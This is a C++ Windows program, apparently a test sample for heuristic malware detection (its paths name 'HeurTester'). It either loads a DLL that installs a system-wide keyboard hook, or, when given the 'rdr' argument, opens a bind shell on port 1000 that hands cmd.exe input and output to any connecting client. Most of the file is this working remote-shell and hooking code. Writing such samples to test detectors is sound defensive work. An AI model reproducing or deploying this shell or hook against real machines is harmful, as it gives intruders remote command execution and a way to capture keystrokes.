// set_hooker.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "set_hooker.h"
#include "serverprotocol.h"

typedef BOOL (*pHookFunc)(void);
typedef BOOL (*pHookFuncByThID)(DWORD);

HMODULE		g_hTestLib = 0;
pHookFunc	g_SetHook = 0;
pHookFunc	g_DelHook = 0;
pHookFunc	g_SetOldHook = 0;
pHookFunc	g_DelOldHook = 0;
pHookFuncByThID g_SetPersonalHook = 0;
pHookFunc	g_DelPersonalHook = 0;



int RemoteRun();

///////////////////////////////////////////////////////////////
//	service function
///////////////////////////////////////////////////////////////
bool InitHookDll()
{
	MessageBox(0, "InitHookDll start", 0, 0);
	if (g_hTestLib)
		return true;
	g_hTestLib = LoadLibrary("c:\\test\\HeurTester\\test_dll.dll");
	if (g_hTestLib == 0) {
		printf("Can`t load test_dll.dll (err=%d)\n", GetLastError());
		MessageBox(0, "Can`t load test_dll.dll", 0, 0);
		return false;
	}
	g_SetHook = (pHookFunc)GetProcAddress(g_hTestLib, "SetHook");
	g_DelHook = (pHookFunc)GetProcAddress(g_hTestLib, "DelHook");
	g_SetOldHook  = (pHookFunc)GetProcAddress(g_hTestLib, "SetOldHook");
	g_DelOldHook = (pHookFunc)GetProcAddress(g_hTestLib, "DelOldHook");
	g_SetPersonalHook = (pHookFuncByThID)GetProcAddress(g_hTestLib, "SetHookByThreadID");
	g_DelPersonalHook = (pHookFunc)GetProcAddress(g_hTestLib, "DelHookByThreadID");
	if (g_SetHook == 0 || g_DelHook == 0 || g_SetPersonalHook == 0 || g_DelPersonalHook == 0) {
		FreeLibrary(g_hTestLib);
		g_hTestLib = 0;
		printf("Some of functions not exported from test_dll.dll\n");
		return false;
	}
	MessageBox(0, "InitHookDll OK", 0, 0);
	return true;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	if (stricmp(lpCmdLine, "rdr") == 0) {
		return RemoteRun();
	}
	else {
		if (!InitHookDll()) {
			printf("SetKeyHookToAll::InitHookDll fail\n");
			return 0;
		}
		if (g_SetHook() == 0) {
			printf("SetHook fail (err=%d)\n", GetLastError());
		}
		Sleep(20000);
		return 0;
	}
	return 0;
}
///////////////////////////////////////////////////////////////
//	
///////////////////////////////////////////////////////////////
int RemoteRun()
{
	SOCKET ServerSocket, ClientSocket;
	bool bClientConnected = false, bServerListening = true;
	bool bRemoteShellRunning = false;
	char Buffer[BUFFER_LENGTH];


	ServerSocket = OpenServer(1000);

	ClientSocket = WaitForClientConnection(ServerSocket);
	bClientConnected = true;
		

	STARTUPINFOA si;
    PROCESS_INFORMATION pi;
	char CMDFullPath[MAX_PATH];
	sprintf(CMDFullPath, "%s\\%s", "c:\\windows\\system32", "cmd.exe");

	memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
	si.hStdOutput = (HANDLE)ClientSocket;
	si.hStdInput = (HANDLE)ClientSocket;
	si.hStdError = (HANDLE)ClientSocket;
	si.dwFlags = STARTF_USESTDHANDLES;
    memset(&pi, 0, sizeof(pi));

	BOOL bRes = CreateProcessA(0, CMDFullPath, 0, 0, TRUE, 0 , 0, 0, &si, &pi);
	DWORD dwErr = GetLastError();
	if (bRes != TRUE) {
		//printf("CreateProcess failed (%d)\n", GetLastError());
		return 0;
	}
	Sleep(500);
    //CloseHandle(pi.hProcess);
    //CloseHandle(pi.hThread);

	//WaitForSingleObject(pi.hProcess, INFINITE);
	//while (1) {
		Sleep(5000);
	//}


	//	while(bClientConnected){
	//		Sleep(5);

	//		//while (bRemoteShellRunning) Sleep(100);

	//		SendTo(ClientSocket,"dir\n\0");
	//		Sleep(1000);

	//		//if (RecvFrom(ClientSocket, &Buffer[0]) == SERVER_SOCKET_ERROR){
	//		//	bClientConnected = false;
	//		//	continue;
	//		//}

	//	}
	//}

	return 0;
}
